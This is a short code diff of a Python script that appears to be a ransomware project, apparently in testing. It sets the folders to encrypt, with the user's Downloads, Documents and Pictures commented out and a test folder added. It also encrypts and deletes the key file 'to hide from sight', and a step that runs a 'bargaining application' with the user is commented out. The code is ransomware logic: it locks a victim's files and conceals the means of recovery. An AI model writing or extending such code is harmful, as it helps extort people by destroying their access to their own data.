@@ -88,6 +88,7 @@ def main():
     # Directories to encrypt in their entirety
     # TODO: Update as needed for testing purposes
     directories_to_encrypt = [
+        "Shark Images"
         # os.path.expanduser("~/Downloads"),
         # os.path.expanduser("~/Documents"),
         # os.path.expanduser("~/Pictures"),
@@ -100,12 +101,11 @@ def main():
     print("Encryption successful!")
 
     # Encrypts and removes the key from the working directory to hide from sight
-    encrypt_file(image_containing_key, key)
-    os.remove(image_containing_key)
+    encrypt_file("key.txt", key)
+    os.remove("key.txt")
 
     # Runs the bargaining application
-    exec(code_to_bargain_with_user)
+    #exec(code_to_bargain_with_user)
 
 
-main()
-'''
+main()'''
